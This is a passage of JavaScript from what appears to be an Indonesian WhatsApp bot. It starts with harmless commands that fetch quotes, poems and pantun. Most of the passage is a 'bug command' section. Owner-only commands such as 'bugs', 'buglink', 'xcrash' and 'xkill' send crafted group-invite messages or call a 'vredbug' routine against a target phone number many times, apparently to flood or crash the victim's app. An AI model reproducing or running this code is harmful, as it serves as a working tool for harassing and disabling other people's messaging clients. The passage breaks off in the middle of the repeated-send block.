						}
					}, {
						quoted: fchannel
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'quotes': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const quot = await fetchJson(`https://www.vreden.my.id/cdn/random/quotes.json`)
					const quote = await pickRandom(quot)
					m.reply(`${quote.quotes}\n\nBy ${quote.author}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'puisi': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const puis = await fetchJson(`https://www.vreden.my.id/cdn/random/${command}.json`)
					const puisi = await pickRandom(puis)
					m.reply(`${puisi}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'pantun': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const pant = await fetchJson(`https://www.vreden.my.id/cdn/random/${command}.json`)
					const pantun = await pickRandom(pant)
					m.reply(`${pantun}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'motivasi': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const motiv = await fetchJson(`https://www.vreden.my.id/cdn/random/${command}.json`)
					const motivasi = await pickRandom(motiv)
					m.reply(`${motivasi}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			//▢━━━━━━━━━━━━━━「 BUG COMMAND 」━━━━━━━━━━━━━━▢
			case 'bugs': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				Pe = m.chat
				if (ownerNumber.includes(Pe)) return m.warning('Tidak Dapat Melakukannya Kepada Owner')
				try {
					var groupInvite = generateWAMessageFromContent(Pe, proto.Message.fromObject({
						"groupInviteMessage": {
							"groupJid": "6288239620884-1626256984@g.us",
							"inviteCode": "sfeVFOlWvlo5Hd9x",
							"inviteExpiration": "166659839399999",
							"groupName": `𝑪𝑶𝑴𝑼𝑵𝑰𝑻𝒀 𝑪𝑳𝑨𝒀(𝑪𝒍𝒐𝒘𝒏𝒔 𝑳𝒂𝒖𝒈𝒉 𝑨𝒕 𝒀𝒐𝒖)©️${ngazap(prefix)}`,
							"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGAAYAMBIgACEQEDEQH/xAAbAAABBQEBAAAAAAAAAAAAAAADAgQFBgcBAP/EADwQAAEDAgQDBQUHAwMFAAAAAAECAxEEIQAFEjEGE0EUIlFhcSMygZGhBxUzUlPB0RY0sSRC8ENicoLh/8QAGAEAAwEBAAAAAAAAAAAAAAAAAAECAwT/xAAfEQEBAQACAgMBAQAAAAAAAAAAARECITFRAxJBYYH/2gAMAwEAAhEDEQA/AMUSy66ho82PZmOYmBEfXAXGHhVPjVJKb6R5+HTAVVSIRBeECDfy6eGDUlQXH16C7BFiCJ+PjjO6z7BS05zECTJ6afP6446w/JIC4gdIw7XznHC432grFypWjbDqlYrKtxDbPaXFrMWKY64WlbTFHNC2wDrIVcdcFWtTmggIASZgJ/zh3WN5fQvBTlfUPqB1ksNpI69SRO24EYkKDLaSrRUOU4ry0hILh5aSeov3vKcRbGd+Se0I00pxrlgNgrJjumTtgC2XEvA8uwsTG18WNigy9yhRmE5iKZBgkpQDaB+af+DEey7klSy57bM0yYlTabbeCvP6YPtBPlhgpJTBIAQu6SU77Y4pp1zmKEaAqCUiRuMSGZ5almjp32VF2n2bdSqzmwtO3oYxHqZKWnCO0A6pI1A2tv54qWLnPaQGHhuTcSJTuMJ7O6WVyoA6jYix2648vvFGg1BDYvKha3THluJ7OtKQ6NapSSq3TFtOxHeUUoAapgSk7Kjp1thLKkpqnfZU0RYTA+BwPnOQOcz7gt3ekYJTut8x1SwtBi8tAj/5fDIp1ZaenlMhE6NIc/z5YkqEqZy7MainaZQQylAKHTPfcQlX0JGIlLtOqo1Fwoiw9n0w+aU0/lmZoQblpr3WoP47eIuJvgwo6Cqrxopqd51xKbhCyehH7jE/wa7931GarcbqXG26bvIS7JI1kGD6fzfYtMloK/KGW69tlxdOUa3WoBKm5iSPAmBix5lUFnMG05Sxqq6xrmVClMAWkkwjYRHr6YzkY8Z+mWY5lSPcJrp6KjrGmu0NrcS66SZvsYG8/TztUlZXU09Kl9+nqUMOBMK1QD7oP74vIeffrmKKvaQ5ldS9uEgEKFt/KTY2xH8S0VVnFQWKQIao2VcoBUN802gb3VAjxhHWMFOq9SPk5RWU5U5y2X2ltJUqySoLn56UfLCW1NpZcltB70H2txtt5YLl9G2zlmZNuOaFNuMAgwf1cJRpQ2uHG4UqbpF/4xpLMaccxx0tJLYDbYtuHJm3W2Eut04pnIbblKt+bJ6eV+uODUoNe1aBHcACZPxx51tQYWkFpaJ/L1t1w+lllSShsBx2w3jy6Wx5gf6hxXMeMjdIv8cB7OYEKNxMBW3Xww7yhSGKmoS+3ze6IBUP3wW0uyFpLtRBW8ttBBskTM/xiQaaaVk+aBt6oWA21ZxMD8ZvwwtyqpG0BXYFgSBIKYnBUOM1WV5izSM8twtBabiTocQoiBfYH5Ym3kXOdeTbKuIKrLuWywzTuogAJcChJ+Hyn1xp7DpeU089Q0zT5YUghKVHSdCxEnr5Yx/h6op2K5p+t5q22wSNKSeh6dcSb/Elaxm1Q9l71QGwAEc0FRgBQBNrmJv64ymRzcMnlfaNDScpWt5pslp8rk2Ma0bT16fHEfxP2x3K2yh5s1DzXNCQCjuTdA6kWkep2jEP/U2XZhlLFPmT1Q06XdZ5LAAO3hGF/wBV5U7VMPOOutGlTymw2wTqbtGuT6Dwxdu+Gl52qpRMuuZdmKib8xmdMk/9XHW2lBtxK+0CVSJFj62xON1dAz96ViGVmgqX0oYDognSFk7/APmPngRzCgLZUimblBjYb4Jb6acPCJWlxXIVLxtBkeu1scUhaqdwS8SVTEW6eWHGavpdDAYS01AJMdflhny1Bpai+2NKoIBJnbF7T2j81pPIjlSEm4TBFvW+HVExU1VWUsMhwuEIbBTIcPgPPDZThIaC+b7tu6PDpjQfs74syzKaGsoahNQzUVDk9tYZbLrQKEDYg2BBPXc2w6KrOa5Dm2Wdm7bl5Zp6l2W0huCuDe2/huB0xqVNwI0M4oEU/Mp101OlyrU2ASXCYGgxa6F7z0thj930+bcY5Q8znzlewtwuFspOtrlwuCCZAXEdPTF44XzamzKqz1SOYh1NYUAEboCAkHfYlCyPXCL/ABU6vh/gescqaZt4M1awuXQ5AFiTEjR4m3QHDDLeDcpe4MzHMQ2+4UJqCy9tqDYIkgjxBMdJxmVcxUtZ1ySagOBzQoBsSI+PT9sbNm5NF9kc0pnmttkSBdK3AT9CcLIjON/FR+zPhXJ86r6mpcoXTSUwu25UGSokaD3YsNC7efliW4n4fyPI+JKLMjQoOWVJCFJ1DlgxBtH5O+IO6TiU+yihqaTgevfpEtmtqtQZLgAAIR3L9O+TifZ4def4POT5iWeY2mGHG++EAXRMxttHgPPDmHMjP/tI4HZTXZO1kzRDDzhaFMp1Swhe9iZIBF42GknxwPjngvh7hvJmlc4u5guPZSnQYjWv3ZA+PUeeNJ4drVM8It1eYsLDlA24hwKSFueykG83MCJ8ZxRuHs8zPiWvzF/7oo8wp3XQ243UtgIaQJgSTYXNwCesYDZE6GS42EKo7dUz/GOqSyaZ2FU2vVYC07dcaJ9p2X8PUiKdeVvAV4Oh2mZVzUN2PU3mY36dMZ4VKNM/CnjDk/hCNxvgHbhU7DXd/wBsfib263tjlN3qp8EALG0Kv8+uI8MtqTYmD6YKwy2gruNv90YexWxo/wBneeU2RO5g8+HF1a2S3TlQCxqN4N7CUDbzwHgziityDNFv8pyopnTodSo2WBMHyI/cjralMqabS4F6DqUNiAdwcP15sSXDpaC5CwoBHdIsI+HrhbB02Ku4r4UKu2nLg5WqIWJpWyvmdCbxIgX8seybi/hx7I6TK32Xi1SsNtnmtIPuIgGyj4Yx13Mg9oaLNOA0lxHupvr3JP8A7kjwwmmzYMgKQwyi0RCPn6i/z9MGxLU6ri+joeGF5fkzFY3UrJWFcrQgFbnMWAuZ6kD4Yq+S8dcQ5fXO1Dz7tUgAgtPqLgg/H0OKs3XNtPU8Ms2d5l1Aj4g2Px+gwVGcBoVHsKUh0EkAJ7np4H9sLS1olfx5TvcIVNEKaoTX1RUdSWQG4W5rX1kWJ8cZoxWV1JllTTslxuneVodB2UJ2I2O/1wb72S2kamKZxZ0XIRM/xN/jgNbWtVLHLLVOJT7wIPWfXqf+RBolNalS1PNFbiyYtrVPT6YUXOWy+rUUS5Ez5jzviOdZISP7fxsoTjymwG55bJJ/7ttsPpeT2fqU2AxCnbC0teXS18DZda7TUD2gEe8GgfmMENPBY0FZkfmjp9MERS0/MdLbzxcgSAqDM/XBbCtkArHWpQQokF0bMRgvNTpN3LXg082jHqto60IQagjmW1wd/D5YMQ4lCP7jupgaVCMBGKmwqrQZdnV+nB69IwbRFRUEVCx3Ru0Z9w9Iwl5xSa5q65W5BuJ+fzwRDbwqKghTq3NIBMjwO/ywbT2hoD3MaLbzjg8Q0T09McU4S3UFx51ZiPwYHxtg9NVPNOtlCyJVfvX6Y9zVhD+h1aCN/aDY74JommFWpPLprOR6bWG1r4LT8ssrC1LbBcJu2fLwH0x6sqFt8jlkweuoeA6dMKRVu8l3WHCOZ+oPLfxOH2fYi+QXWhzptuGiD/jHlNNFh+axYHM/RJBuOsWw1qFKdcaLiXNZTfU4P5tji57M7PNnVeXB4jpgwfX+v//Z",
							"caption": `${command}\n*https://wa.me/settings*\n${botName} ${ngazap(prefix)}`,
						}
					}), {
						userJid: Pe,
						quoted: m
					})
					if (args.length == 0) return m.warning(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
					jumlah = `${encodeURI(q)}`
					for (let i = 0; i < jumlah; i++) {
						vreden.relayMessage(Pe, groupInvite.message, {
							messageId: groupInvite.key.id
						})
						await sleep(2000)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case "xvir":
			case 'xstik':
			case "xlist":
			case "xbutton":
			case "x24j":
			case "xuia":
			case "xlec":
			case "xforce":
			case "xva":
			case "xta":
			case "xcrash":
			case "xbom":
			case "xbug":
			case "xkill":
			case "xloc":
			case "xdoc":
			case 'xhit': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let good = text.split(',');
				if (good.length < 2) return m.reply(`*Masukan Input Dengan Benar!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
				if (isNaN(good[0])) return m.warning(`*Nomor Harus Berupa Angka!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
				if (!good[0]) return m.warning(`*Masukan Nombor!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
				if (!good[1]) return m.warning(`*Masukan Jumlah Yang Dikirim!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
				if (isNaN(good[1])) return m.warning(`*Jumlah Bug Harus Berupa Angka!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
				let onlen = await vreden.onWhatsApp(good[0])
				if (onlen.length == 0) return m.reply('*Nomor Tersebut Tidak Ada Di WhatsApp!*')
				try {
					m.reply(`*[ </> ]* Mengirimkan ${command}...`)
					await sleep(1000)
					vredbug(onlen[0].jid, good[1])
					await sleep(2000)
					m.reply(`*[ </> ]* Done sent!`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '🌷':
			case '🐲':
			case '🐉':
			case '🌵':
			case '🎄':
			case '🌲':
			case '🌳':
			case '🌱':
			case '🌿':
			case '🍀':
			case '☘️':
			case 'buglink': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!args[0]) return m.warning(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
				Pe = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (ownerNumber.includes(Pe)) return m.warning('Tidak Dapat Melakukannya Kepada Owner')
				try {
					var groupInvite = generateWAMessageFromContent(Pe, proto.Message.fromObject({
						"groupInviteMessage": {
							"groupJid": "6288239620884-1626256984@g.us",
							"inviteCode": "sfeVFOlWvlo5Hd9x",
							"inviteExpiration": "166659839399999",
							"groupName": `𝑪𝑶𝑴𝑼𝑵𝑰𝑻𝒀 𝑪𝑳𝑨𝒀(𝑪𝒍𝒐𝒘𝒏𝒔 𝑳𝒂𝒖𝒈𝒉 𝑨𝒕 𝒀𝒐𝒖)©️${ngazap(prefix)}`,
							"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGAAYAMBIgACEQEDEQH/xAAbAAABBQEBAAAAAAAAAAAAAAADAgQFBgcBAP/EADwQAAEDAgQDBQUHAwMFAAAAAAECAxEEIQAFEjEGE0EUIlFhcSMygZGhBxUzUlPB0RY0sSRC8ENicoLh/8QAGAEAAwEBAAAAAAAAAAAAAAAAAAECAwT/xAAfEQEBAQACAgMBAQAAAAAAAAAAARECITFRAxJBYYH/2gAMAwEAAhEDEQA/AMUSy66ho82PZmOYmBEfXAXGHhVPjVJKb6R5+HTAVVSIRBeECDfy6eGDUlQXH16C7BFiCJ+PjjO6z7BS05zECTJ6afP6446w/JIC4gdIw7XznHC432grFypWjbDqlYrKtxDbPaXFrMWKY64WlbTFHNC2wDrIVcdcFWtTmggIASZgJ/zh3WN5fQvBTlfUPqB1ksNpI69SRO24EYkKDLaSrRUOU4ry0hILh5aSeov3vKcRbGd+Se0I00pxrlgNgrJjumTtgC2XEvA8uwsTG18WNigy9yhRmE5iKZBgkpQDaB+af+DEey7klSy57bM0yYlTabbeCvP6YPtBPlhgpJTBIAQu6SU77Y4pp1zmKEaAqCUiRuMSGZ5almjp32VF2n2bdSqzmwtO3oYxHqZKWnCO0A6pI1A2tv54qWLnPaQGHhuTcSJTuMJ7O6WVyoA6jYix2648vvFGg1BDYvKha3THluJ7OtKQ6NapSSq3TFtOxHeUUoAapgSk7Kjp1thLKkpqnfZU0RYTA+BwPnOQOcz7gt3ekYJTut8x1SwtBi8tAj/5fDIp1ZaenlMhE6NIc/z5YkqEqZy7MainaZQQylAKHTPfcQlX0JGIlLtOqo1Fwoiw9n0w+aU0/lmZoQblpr3WoP47eIuJvgwo6Cqrxopqd51xKbhCyehH7jE/wa7931GarcbqXG26bvIS7JI1kGD6fzfYtMloK/KGW69tlxdOUa3WoBKm5iSPAmBix5lUFnMG05Sxqq6xrmVClMAWkkwjYRHr6YzkY8Z+mWY5lSPcJrp6KjrGmu0NrcS66SZvsYG8/TztUlZXU09Kl9+nqUMOBMK1QD7oP74vIeffrmKKvaQ5ldS9uEgEKFt/KTY2xH8S0VVnFQWKQIao2VcoBUN802gb3VAjxhHWMFOq9SPk5RWU5U5y2X2ltJUqySoLn56UfLCW1NpZcltB70H2txtt5YLl9G2zlmZNuOaFNuMAgwf1cJRpQ2uHG4UqbpF/4xpLMaccxx0tJLYDbYtuHJm3W2Eut04pnIbblKt+bJ6eV+uODUoNe1aBHcACZPxx51tQYWkFpaJ/L1t1w+lllSShsBx2w3jy6Wx5gf6hxXMeMjdIv8cB7OYEKNxMBW3Xww7yhSGKmoS+3ze6IBUP3wW0uyFpLtRBW8ttBBskTM/xiQaaaVk+aBt6oWA21ZxMD8ZvwwtyqpG0BXYFgSBIKYnBUOM1WV5izSM8twtBabiTocQoiBfYH5Ym3kXOdeTbKuIKrLuWywzTuogAJcChJ+Hyn1xp7DpeU089Q0zT5YUghKVHSdCxEnr5Yx/h6op2K5p+t5q22wSNKSeh6dcSb/Elaxm1Q9l71QGwAEc0FRgBQBNrmJv64ymRzcMnlfaNDScpWt5pslp8rk2Ma0bT16fHEfxP2x3K2yh5s1DzXNCQCjuTdA6kWkep2jEP/U2XZhlLFPmT1Q06XdZ5LAAO3hGF/wBV5U7VMPOOutGlTymw2wTqbtGuT6Dwxdu+Gl52qpRMuuZdmKib8xmdMk/9XHW2lBtxK+0CVSJFj62xON1dAz96ViGVmgqX0oYDognSFk7/APmPngRzCgLZUimblBjYb4Jb6acPCJWlxXIVLxtBkeu1scUhaqdwS8SVTEW6eWHGavpdDAYS01AJMdflhny1Bpai+2NKoIBJnbF7T2j81pPIjlSEm4TBFvW+HVExU1VWUsMhwuEIbBTIcPgPPDZThIaC+b7tu6PDpjQfs74syzKaGsoahNQzUVDk9tYZbLrQKEDYg2BBPXc2w6KrOa5Dm2Wdm7bl5Zp6l2W0huCuDe2/huB0xqVNwI0M4oEU/Mp101OlyrU2ASXCYGgxa6F7z0thj930+bcY5Q8znzlewtwuFspOtrlwuCCZAXEdPTF44XzamzKqz1SOYh1NYUAEboCAkHfYlCyPXCL/ABU6vh/gescqaZt4M1awuXQ5AFiTEjR4m3QHDDLeDcpe4MzHMQ2+4UJqCy9tqDYIkgjxBMdJxmVcxUtZ1ySagOBzQoBsSI+PT9sbNm5NF9kc0pnmttkSBdK3AT9CcLIjON/FR+zPhXJ86r6mpcoXTSUwu25UGSokaD3YsNC7efliW4n4fyPI+JKLMjQoOWVJCFJ1DlgxBtH5O+IO6TiU+yihqaTgevfpEtmtqtQZLgAAIR3L9O+TifZ4def4POT5iWeY2mGHG++EAXRMxttHgPPDmHMjP/tI4HZTXZO1kzRDDzhaFMp1Swhe9iZIBF42GknxwPjngvh7hvJmlc4u5guPZSnQYjWv3ZA+PUeeNJ4drVM8It1eYsLDlA24hwKSFueykG83MCJ8ZxRuHs8zPiWvzF/7oo8wp3XQ243UtgIaQJgSTYXNwCesYDZE6GS42EKo7dUz/GOqSyaZ2FU2vVYC07dcaJ9p2X8PUiKdeVvAV4Oh2mZVzUN2PU3mY36dMZ4VKNM/CnjDk/hCNxvgHbhU7DXd/wBsfib263tjlN3qp8EALG0Kv8+uI8MtqTYmD6YKwy2gruNv90YexWxo/wBneeU2RO5g8+HF1a2S3TlQCxqN4N7CUDbzwHgziityDNFv8pyopnTodSo2WBMHyI/cjralMqabS4F6DqUNiAdwcP15sSXDpaC5CwoBHdIsI+HrhbB02Ku4r4UKu2nLg5WqIWJpWyvmdCbxIgX8seybi/hx7I6TK32Xi1SsNtnmtIPuIgGyj4Yx13Mg9oaLNOA0lxHupvr3JP8A7kjwwmmzYMgKQwyi0RCPn6i/z9MGxLU6ri+joeGF5fkzFY3UrJWFcrQgFbnMWAuZ6kD4Yq+S8dcQ5fXO1Dz7tUgAgtPqLgg/H0OKs3XNtPU8Ms2d5l1Aj4g2Px+gwVGcBoVHsKUh0EkAJ7np4H9sLS1olfx5TvcIVNEKaoTX1RUdSWQG4W5rX1kWJ8cZoxWV1JllTTslxuneVodB2UJ2I2O/1wb72S2kamKZxZ0XIRM/xN/jgNbWtVLHLLVOJT7wIPWfXqf+RBolNalS1PNFbiyYtrVPT6YUXOWy+rUUS5Ez5jzviOdZISP7fxsoTjymwG55bJJ/7ttsPpeT2fqU2AxCnbC0teXS18DZda7TUD2gEe8GgfmMENPBY0FZkfmjp9MERS0/MdLbzxcgSAqDM/XBbCtkArHWpQQokF0bMRgvNTpN3LXg082jHqto60IQagjmW1wd/D5YMQ4lCP7jupgaVCMBGKmwqrQZdnV+nB69IwbRFRUEVCx3Ru0Z9w9Iwl5xSa5q65W5BuJ+fzwRDbwqKghTq3NIBMjwO/ywbT2hoD3MaLbzjg8Q0T09McU4S3UFx51ZiPwYHxtg9NVPNOtlCyJVfvX6Y9zVhD+h1aCN/aDY74JommFWpPLprOR6bWG1r4LT8ssrC1LbBcJu2fLwH0x6sqFt8jlkweuoeA6dMKRVu8l3WHCOZ+oPLfxOH2fYi+QXWhzptuGiD/jHlNNFh+axYHM/RJBuOsWw1qFKdcaLiXNZTfU4P5tji57M7PNnVeXB4jpgwfX+v//Z",
							"caption": `${command}\n*https://wa.me/settings*\n${botName} ${ngazap(prefix)}`,
						}
					}), {
						userJid: Pe,
						quoted: m
					})
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
